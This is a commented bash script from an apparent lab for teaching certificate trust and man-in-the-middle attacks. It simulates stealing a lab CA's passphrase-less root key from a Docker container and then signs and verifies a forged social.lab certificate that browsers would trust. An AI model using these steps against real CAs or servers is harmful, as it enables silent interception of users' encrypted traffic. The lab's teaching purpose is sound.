#!/bin/bash
# OPTION 2 - the "stolen CA key" attack. Run from the project root ON THE HOST.
#
# This is the catastrophe case. It assumes the attacker has already broken into
# a server and walked off with the lab CA's ROOT PRIVATE KEY (in this lab the
# key lives in the `ca` instance and has no passphrase, so a copy is enough).
# With that key the attacker signs its OWN certificate for social.lab - a
# certificate that really does chain to the lab Root CA every browser trusts.
#
# The result: with this forged certificate, the DNS/hosts spoof from option 1
# produces NO browser warning. The padlock is green, the chain verifies, and
# the victim has no visual cue at all. That is why a CA's private key is the
# crown jewel: lose it and the whole trust model collapses until the root is
# revoked and every client stops trusting it.
#
# It writes the forged cert to attacker/server-forged/ and does NOT touch the
# self-signed cert from option 1 (attacker/server/). Switch between them with
# ./attacker/mode.sh.
set -e
cd "$(dirname "$0")/.."

# Where the CA key is stolen from, and where it lives inside that container.
CA_SRC="ca"                                   # container the CA key is stolen from
CA_KEY="/app/demoCA/private/cakey.pem"        # ...and where it sits there
CA_CERT="/app/demoCA/cacert.pem"              # the matching public root cert
DOMAIN="social.lab"                           # the name we forge a cert for
OUT="attacker/server-forged"                  # where the forged key+cert go
STOLEN="attacker/stolen-ca"                   # where the loot (CA key+cert) go

# Create both folders and lock them to the owner (they will hold private keys).
mkdir -p "$OUT" "$STOLEN"
chmod 700 "$OUT" "$STOLEN"

echo "[1/4] Exfiltrating the CA root key + cert from the '$CA_SRC' server ..."
# Read the two files out of the running CA container and save them locally.
# "docker compose exec -T ca cat <file>" prints the file's bytes to stdout;
# "> local" captures them. (-T = no TTY, needed when redirecting output.)
# This stands in for a real breach - here the key has no passphrase, so a
# plain copy is all it takes to fully own the CA.
docker compose exec -T "$CA_SRC" cat "$CA_KEY"  > "$STOLEN/cakey.pem"
docker compose exec -T "$CA_SRC" cat "$CA_CERT" > "$STOLEN/cacert.pem"
chmod 600 "$STOLEN/cakey.pem"
# "wc -c" counts bytes - just a sanity check that we actually got the key.
echo "      got $(wc -c < "$STOLEN/cakey.pem") bytes of CA private key (no passphrase)."

echo "[2/4] Making a fresh key + CSR for $DOMAIN ..."
# A brand-new key pair for our fake social.lab server...
openssl genrsa -out "$OUT/key.pem" 2048 2>/dev/null
# ...and a CSR (certificate signing request) that carries that key's public
# half plus the name we want. Normally this goes to the CA to be signed - but
# we are about to sign it ourselves with the stolen key.
openssl req -new -key "$OUT/key.pem" -out "$OUT/social.csr" \
    -subj "/O=Social Lab/CN=$DOMAIN" 2>/dev/null
chmod 600 "$OUT/key.pem"

echo "[3/4] Signing it with the STOLEN CA key (a leaf cert, just like a real one) ..."
# The extensions that make it look like a genuine website certificate:
# CA:FALSE (a leaf, can't sign others), server key usages, and the real name
# in the Subject Alternative Name (what browsers check).
cat > "$OUT/ext.cnf" <<EOF
basicConstraints=critical,CA:FALSE
keyUsage=critical,digitalSignature,keyEncipherment
extendedKeyUsage=serverAuth
subjectAltName=DNS:$DOMAIN
EOF
# "openssl x509 -req" signs our CSR into a certificate. The crucial flags:
#   -CA / -CAkey   sign using the STOLEN CA cert + CA private key, so the
#                  result is issued by "CA Lab Root CA" - the very root Alice
#                  trusts. (Note: this needs only the key+cert, not the CA's
#                  index/serial database - a thief doesn't have those.)
#   -CAcreateserial  make the serial-number file openssl needs here
#   -extfile       apply the extensions above
openssl x509 -req -in "$OUT/social.csr" \
    -CA "$STOLEN/cacert.pem" -CAkey "$STOLEN/cakey.pem" -CAcreateserial \
    -days 365 -extfile "$OUT/ext.cnf" -out "$OUT/cert.pem" 2>/dev/null

echo "[4/4] Checking the forged cert chains to the lab Root CA ..."
# Prove it: "openssl verify -CAfile <root>" returns OK only if the cert really
# was signed by that root. Because it was (with the stolen key), it passes -
# which is why Alice's browser will show no warning.
openssl verify -CAfile "$STOLEN/cacert.pem" "$OUT/cert.pem" | sed 's/^/      /'
# Subject is our fake site; issuer is now the real lab CA (not ourselves).
openssl x509 -in "$OUT/cert.pem" -noout -subject -issuer | sed 's/^/      /'
echo
echo "Done. The forged certificate is in $OUT/ and is trusted by the lab CA."
echo "Serve it with:  ./attacker/mode.sh trusted"
